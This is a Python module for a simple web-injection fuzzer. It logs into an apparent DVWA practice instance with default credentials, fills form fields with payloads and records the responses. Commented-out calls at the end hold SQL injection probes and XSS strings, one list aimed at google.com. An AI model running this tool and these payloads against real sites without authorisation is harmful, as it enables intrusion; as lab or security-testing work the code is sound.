import requests
from .parse import postParser
# from parse import postParser
# from ..models import xss
from requests.utils import requote_uri
from bs4 import BeautifulSoup as bs4
import re


URL = "http://47.245.99.142/login.php"

def createSession(url, username="admin", password="password"):
    s = requests.Session()
    soup = bs4(s.get(url).content, "html.parser")
    hidden = soup.find("input", type="hidden")
    token = hidden.get("value")
    payload = {"username": username, "password": password, "Login":"Login", "user_token": token}
    s.post(url, data=payload)
    return s

def findInput(url, session = None):
    # s = createSession(URL)
    # content = s.get(url).content
    if (session is not None):
        content = session.get(url).content
    else:
        content = requests.get(url).content
    soup = bs4(content, "html.parser")
    input_form = soup.find_all("input")
    return [i.get("name") for i in input_form if i.get("name") is not None]

def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
    context_data = {}
    if (login_dvwa):
        session = createSession(URL)
        input_id = findInput(url, session)
    else:
        input_id = findInput(url) # type list
    
    context_data = {
        "url": url,
        "input_id": input_id,
        "type_attack": type_attack
    }
    return context_data

# post request -> url, payloads, data (x-urlformencoded)

def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False):
    # get each value from data.values()
    # from value, check whether it has "$$" or not
    #   if "$$" exists, change to payload
    #   else, continue to another value
    # return data dictionary filled with payloads

    # initial_data = {"ie": "", "gl": "$$"}

    # data = [{"ie": payload1, "hl": "a", "h3": "b"}, {"ie": payload2, "hl": "a", "h3": "b"}]
    
    if (login_dvwa):
        session = createSession(URL)
    else:
        session = requests
    current_data = data.copy()
    for key, value in data.items():
        if (re.search("\$(.*?)\$", value) != None):
            v = postParser(value, payloads)
            current_data[key] = v
    
    processed_data = []
    for key, value in current_data.items():
        if (len(value) > 1 and isinstance(value, list)):
            for item in value:
                initial_data = data.copy()
                initial_data[key] = item
                processed_data.append(initial_data) # not a copy?
    
    result = []
    for index, value_dict in enumerate(processed_data):
        response = session.post(url, json = value_dict)
        status_code = response.status_code
        try:
            content_length = response.headers["Content-Length"]
        except:
            content_length = len(response.text)
        
        result.append([payloads[index], status_code, content_length]) 
    print(len(processed_data), len(payloads))
    return result


# if __name__ == "__main__":
    # post_request("http://47.245.99.142/vulnerabilities/sqli/", [requote_uri(payload) for payload in ["ORDER BY 4--", "and (select substring(@@version,1,1))='X"]], {"id": "$$", "Submit": "Submit"}, login_dvwa=True)
# post_request("http://google.com", ["<script>alert('123')</script>", '-prompt(8)-', "'-prompt(8)-'", '";a=prompt,a()//', "';a=prompt,a()//", '\'-eval("window[\'pro\'%2B\'mpt\'](8)")-\'', '-eval("window[\'pro\'%2B\'mpt\'](8)")-', '"onclick=prompt(8)>"@x.y', '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y'], {"data": "data", "d": "$$"})